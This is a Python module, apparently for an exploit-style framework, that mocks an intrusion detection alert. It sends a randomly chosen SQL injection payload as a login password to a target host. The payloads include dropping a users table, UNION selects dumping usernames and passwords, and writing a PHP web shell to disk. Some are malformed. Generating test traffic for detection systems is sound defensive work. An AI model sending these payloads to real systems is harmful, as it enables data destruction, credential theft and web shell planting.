import pwn, Util,random,requests

class exploit(object):
    def __init__(self):
        self.Name = "NIDS_Mock1"
        self.Description = "Fake the first nids alert"
        self.Author = "René van Vliet"
        self.Version = "0.1"
        self.POC = ""
        self.Type = Util.Type.Remote
        self.Platform = Util.Platform.Linux

        self.HOST = None
        self.PORT = 8000

        self.possible_queries = [
         "; drop users- --",
         "un/**/ion select * from users- --",
         "uniOn select concat(username,password) from users- --",
         "; select ls from cmd- --",
         "; select '<?php exec($_SYSTEM[c])?>' into outfile shell.php- --",
         "; union select 1,2,3,4,5- --",
        ]

    def exploit(self):
        query = random.choice(self.possible_queries)
        requests.post(self.HOST,{"username":"admin","password":query})


    def _validate(self):
        if(self.HOST == None):
            print(f"[{self.Name}] No valid parameters.")
            exit(1)


    def run(self):
        self._validate()
        self.exploit()
